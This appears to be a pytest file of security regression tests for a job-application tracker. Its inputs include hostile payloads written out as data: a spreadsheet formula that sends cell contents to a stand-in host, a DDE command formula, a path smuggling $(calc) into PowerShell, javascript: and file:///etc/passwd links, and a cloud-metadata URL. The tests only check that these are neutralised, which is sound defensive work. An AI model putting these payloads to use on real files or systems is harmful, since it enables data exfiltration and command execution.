"""Regression tests for the issues found in the security review."""
import json
import subprocess

import openpyxl
import pytest

from jhq import build_package, config, net, pdf_export
from jhq import tracker as trk
from jhq.radar import leads, sync


# ---- spreadsheet formula injection (job titles come from the internet) ----
def test_text_starting_with_equals_is_never_a_formula(data):
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'
    trk.add([{"Company": evil, "Job Title": "Analyst", "Notes": "=1+1"}], data)
    trk.update([{"id": "APP-001", "fields": {"Notes+": "=2+2", "Main Gaps": "=3+3"}}], data)
    ws = openpyxl.load_workbook(data.tracker)["Applications"]
    row = {ws.cell(1, c).value: ws.cell(2, c) for c in range(1, ws.max_column + 1)}
    for col in ("Company", "Notes", "Main Gaps"):
        assert row[col].data_type == "s", col
    assert row["Company"].value == evil
    import zipfile
    sheet = zipfile.ZipFile(data.tracker).read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in sheet


def test_control_characters_are_dropped(data):
    trk.add([{"Company": "Acme\x0b Co\x07", "Job Title": "Analyst"}], data)
    assert trk.rows(data)[0]["Company"] == "Acme Co"


def test_bad_percentages_are_rejected(data):
    for bad in ("abc", "150%", -0.2):
        with pytest.raises(SystemExit):
            trk.add([{"Company": "A", "Job Title": "B", "ATS Low": bad}], data)


def test_second_interview_keeps_first_interview_date(data):
    trk.add([{"Company": "A", "Job Title": "B", "Date Applied": "2026-01-01"}], data)
    trk.event("APP-001", "interview", date="2026-01-10", paths=data)
    trk.event("APP-001", "interview", date="2026-01-20", paths=data)
    assert trk.rows(data)[0]["First Interview Date"] == "2026-01-10"


# ---- PDF export must not paste paths into the PowerShell script ----
def test_word_export_passes_paths_outside_the_script(tmp_path, monkeypatch):
    seen = {}

    def fake_run(cmd, **kw):
        seen["cmd"], seen["env"] = cmd, kw.get("env") or {}
        return subprocess.CompletedProcess(cmd, 1, "", "stop here")

    monkeypatch.setattr(pdf_export.subprocess, "run", fake_run)
    evil = tmp_path / "Acme’+$(calc)+’ - T"
    evil.mkdir()
    with pytest.raises(pdf_export.ExportError):
        pdf_export._word_windows(evil / "a.docx", evil / "a.pdf")
    script = seen["cmd"][-1]
    assert "calc" not in script and "Acme" not in script
    assert "calc" in seen["env"]["JHQ_DOCX"]


# ---- documents survive odd characters from postings ----
def test_job_description_with_control_characters_builds(data, tmp_path):
    (tmp_path / "jd.txt").write_text("Role\x0bwith\x0c odd\x07 characters\n", encoding="utf-8")
    spec = {"company": "Ctl", "title": "T",
            "jd": {"summary": [["Company", "Ctl\x0b"]], "text_file": str(tmp_path / "jd.txt")}}
    (tmp_path / "s.json").write_text(json.dumps(spec), encoding="utf-8")
    rep = build_package.run(tmp_path / "s.json", paths=data)
    assert "Job Description.docx" in rep["files"]


# ---- outbound requests ----
@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/",   # cloud metadata
    "http://[::1]:8765/",
    "http://0.0.0.0/",
    "https://user:pass@example.com/",
    "ftp://example.com/x",
])
def test_net_refuses_non_public_targets(url):
    with pytest.raises(ValueError):
        net.check_url(url, block_job_boards=False)


# ---- leads and sync ----
def test_leads_drop_non_web_links_and_bad_fit():
    rec = leads.normalise({"fit": "very high", "company": "A", "title": "B",
                           "link": "javascript:alert(1)", "careers": "file:///etc/passwd"})
    assert "link" not in rec and "careers" not in rec and "fit" not in rec


def test_package_notes_cannot_set_status_or_dates(data):
    lead = leads.normalise({"fit": 8, "company": "Acme", "title": "Analyst", "link": "https://example.com/1"})
    leads.add_leads([lead], data)
    config.write_json(data.applications / "Acme - Analyst" / "tracker_meta.json", {
        "company": "Acme", "title": "Analyst",
        "fields": {"Status": "Offer", "Date Applied": "2020-01-01", "Offer Date": "2020-02-01",
                   "ATS Match When Applied": "70-80%"}})
    config.write_json(data.lead_status, {lead["id"]: {"status": "Applied", "at": "2026-10-01T09:00"}})
    sync.sync(data)
    row = trk.rows(data)[0]
    assert row["Status"] == "Applied" and row["Date Applied"] == "2026-10-01"
    assert not row.get("Offer Date") and row["ATS Match When Applied"] == "70-80%"


def test_company_names_cannot_be_formulas(data, tmp_path):
    from jhq.radar import companies
    f = tmp_path / "c.json"
    f.write_text(json.dumps([{"company": "=cmd|' /C calc'!A0", "ats": "greenhouse", "slug": "acme"}]))
    companies.main(["add", str(f)])
    assert companies.load(data)[0]["company"].startswith("cmd")
